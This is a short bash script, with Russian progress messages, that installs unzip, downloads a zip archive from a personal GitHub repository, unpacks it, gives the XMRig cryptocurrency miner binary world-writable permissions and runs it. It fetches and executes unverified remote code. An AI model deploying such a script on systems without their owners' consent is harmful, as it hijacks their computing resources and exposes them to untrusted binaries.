#!/bin/bash

echo -e "\033[0m\n\033[0m\033[31m - Установка компонентов"

apt-get update

apt install unzip

echo -e "\033[0m\n\033[0m\033[31m - Создание папки"

mkdir s_mine

echo -e "\033[0m\n\033[0m\033[31m - Переход в папку"

cd s_mine

echo -e "\033[0m\n\033[0m\033[31m - Скачивание суши"

wget https://github.com/Hentai624/1/raw/master/m.zip

echo -e "\033[0m\n\033[0m\033[31m - Расспаковка"

unzip m

echo -e "\033[0m\n\033[0m\033[31m - Выдача прав"

chmod 777 xmrig

echo -e "\033[0m\n\033[0m\033[31m - Запуск скрин"

screen

./xmrig